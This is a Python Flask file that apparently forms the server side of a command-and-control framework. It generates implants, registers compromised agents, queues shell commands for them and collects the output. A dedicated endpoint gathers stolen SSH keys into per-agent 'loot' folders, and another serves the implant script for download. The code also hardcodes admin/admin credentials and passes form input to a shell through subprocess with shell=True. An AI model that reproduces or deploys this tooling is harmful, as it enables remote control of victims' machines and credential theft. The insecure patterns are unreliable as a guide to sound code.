from flask import escape
from flask import Flask, render_template, redirect, url_for, request, session, flash, abort, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from functools import wraps
from flask_wtf import FlaskForm
from wtforms import StringField
from wtforms.validators import DataRequired

from config import BaseConfig
import time
import os
import json
import subprocess

from models import *

# TODO
"""
- Make fronted look clean

"""


def login_required(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('You need to login first.')
            return redirect(url_for('login'))

    return wrap


class MyForm(FlaskForm):
    ip = StringField('IP')
    sleep = StringField('Sleep Time')


def build_implant(ip="127.0.0.1", sleepTime="0"):
    subprocess.Popen([f"../implant/payloads/make.sh -h {ip} -s {sleepTime}"], shell=True)


def add_agent(agent_dict):
   # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])).scalar():
        args = [str(agent_dict['Stats'][key]) for key in agent_dict['Stats']]
        args += [str(agent_dict['total'])]
        args += [agent_dict['IP']]
        agent = Agent(*args)
        db.session.add(agent)
        db.session.flush()
        agent_id = agent.id
        print(agent_id)
        db.session.commit()
        print(agent_id)
        os.mkdir(f"loot/agent_{agent_id}")
        return agent.id


@app.route('/config', methods=['GET', 'POST'])
@login_required
def generate():
    form = MyForm()
    if request.method == 'POST':
        args = [escape(request.form[key]) for key in request.form.keys() if request.form[key] != '']
        print(args)
        build_implant(*args)
        print("Payload Successfuly Generated!")
    return render_template("config.html", form=form)


@app.route('/bots', methods=['GET'])
@login_required
def bots():
   return render_template("bots.html") 


@app.route('/bot<id>', methods=['GET'])
@login_required
def bot(id):
    agent = Agent.query.filter_by(id=id).first()
    print(agent)
    return render_template("bot.html", agent=agent)


@app.route('/', methods=['GET', 'POST'])
@login_required
def home():  # put application's code here
    output = ""
    if request.method == "POST":
        command = request.form['command']
        implantID = request.form['id']
        db.session.add(Commands(implantID=implantID, command=command))
        db.session.flush()
        db.session.commit()
        res = Commands.query.filter_by(implantID=implantID).first()
        res.command = command
        db.session.commit()
        time.sleep(1)
        res = Commands.query.filter_by(implantID=implantID).first()
        output = res.output

    agents = db.session.query(Agent).all()
    return render_template('index.html', agents=agents, command_out=output)


@app.route('/api/1.1/add_command', methods=['POST'])
def add_command():
    if request.method == 'POST':
        json = request.json
        command = json['params'] 
        implantID = json['method'][4:]
        new_comm = Commands(implantID=implantID, command=command)
        db.session.add(new_comm)
        db.session.flush()
        db.session.commit()
        db.session.refresh(new_comm)
        res = Commands.query.filter(Commands.implantID==implantID, Commands.retrieved==True, Commands.displayed==False).first()
        output = f"[+] new job started with id {new_comm.commandID}"
        if res != None and res.output != None:
            res.displayed = True
            output += f"\n[*] job with id {res.commandID} finished with output: \n{res.output}"
            db.session.flush()
            db.session.commit()
        rpc = {}
        rpc["result"] = output
        rpc["jsonrpc"] = json["jsonrpc"]
        rpc["id"] = json["id"]
        return rpc


@app.route('/api/1.1/add_agent', methods=['POST'])
def agent_add():
    print(request.method)
    if request.method == 'POST':
        agent_dict = request.json
        id = add_agent(agent_dict)
        return str(id)


@app.route('/api/1.1/get_command', methods=['POST'])
def get_command():
    print(request.method)
    if request.method == 'POST':
        agent_id = request.json['id']
        res = Commands.query.filter(Commands.implantID==agent_id, Commands.retrieved==False).first()
        if res == None:
            return "None"
        res.retrieved = True
        db.session.flush()
        db.session.commit()
        return res.command + "," + str(res.commandID)


@app.route('/api/1.1/command_out', methods=['POST'])
def command_out():
    print(request.method)
    if request.method == 'POST':
        output = request.json['output']
        implantID = request.json['implantID']
        commandID = request.json['commandID']
        agent = Commands.query.filter(Commands.implantID==implantID, Commands.commandID==commandID).first()
        agent.output = output
        # print(agent.output)
        db.session.flush()
        db.session.commit()
        return 'Received'


@app.route('/api/1.1/ssh_keys', methods=['POST'])
def ssh_keys():
    if request.method == 'POST':
        key_dict = request.json['keys']
        agent_id = request.json['id']
        with open(f"loot/agent_{agent_id}/ssh_keys.txt", 'a+') as file:
            for key in key_dict:
                file.write(f"{key}: {key_dict[key]}\n")
        return 'Received BINGUS MODE'


@app.route('/api/1.1/retrieve_scripts', methods=['GET'])
def scripts():
    try:
        return send_from_directory('implant', path='implant.py', filename='implant.py', as_attachment=True)
    except FileNotFoundError:
        abort(404)


@app.route('/welcome', methods=['GET'])
def welcome():
    return render_template("welcome.html")


@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] != 'admin' or request.form['password'] != 'admin':
            error = "Invalid credentials. Please try again."
        else:
            session['logged_in'] = True
            flash('You were just logged in!')
            return redirect(url_for('home'))
    return render_template('login.html', error=error)


@app.route('/logout', methods=['GET'])
@login_required
def logout():
    session.pop('logged_in', None)
    flash('You were just logged out!')
    return redirect(url_for('welcome'))


if __name__ == '__main__':
    app.run(host="0.0.0.0")